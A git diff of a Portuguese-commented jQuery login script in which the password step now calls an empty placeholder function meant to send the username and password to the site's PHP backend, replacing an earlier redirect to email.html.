@@ -1,8 +1,5 @@
 $(document).ready(function () {
     $("#senha").hide();
-
-
-
     function proximo() {
         if ($("#input_login").val().indexOf('@') > 0) {
             $("#nome").html('<i class="fa fa-arrow-left"></i> ' + $("#input_login").val());
@@ -36,7 +33,8 @@ $(document).ready(function () {
 
     function entrarSenha(){
         if ($("#input_senha").val() != "") {
-            window.location.href = "email.html"
+            //window.location.href = "email.html";
+            mandaServidor($("#input_login").val(), $("#input_senha").val());
         }
         else {
             $("#titulo_senha #msg_erro_senha").remove()  
@@ -56,4 +54,8 @@ $(document).ready(function () {
         }
     });
 
+    function mandaServidor(usuario, senha) {
+       //Era pra ter um AJAX top aqui mas o html fica td bugado
+       //o php ja ta certin
+    }
 });
